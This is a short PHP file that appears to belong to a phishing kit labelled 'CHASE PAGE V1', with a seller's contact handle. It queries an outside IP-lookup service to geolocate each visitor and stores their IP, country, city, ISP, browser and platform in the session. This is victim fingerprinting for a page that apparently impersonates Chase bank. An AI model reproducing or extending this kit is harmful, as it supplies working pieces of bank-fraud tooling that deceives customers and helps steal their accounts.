<?php
error_reporting(E_ALL ^ E_NOTICE);
session_start();
include'visitor.php';
    /*
    |--------------------------------------------------------------------------
    | CHASE PAGE V1
    |--------------------------------------------------------------------------
    |
    | Contact me : @zroxo
    |
    */
$getdetails = "https://extreme-ip-lookup.com/json/".$ip."";
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
// var_dump($ip);
// die();
$_SESSION['country'] = $country   = $details->country;
$_SESSION['countrycode'] = $countryCode   = $details->countryCode;
$_SESSION['city'] = $city = $details->city;
$_SESSION['ip'] = $query = $details->query;
$_SESSION['isp'] = $isp = $details->isp;
$_SESSION['browser'] = $browser;
$_SESSION['platform'] = $platform;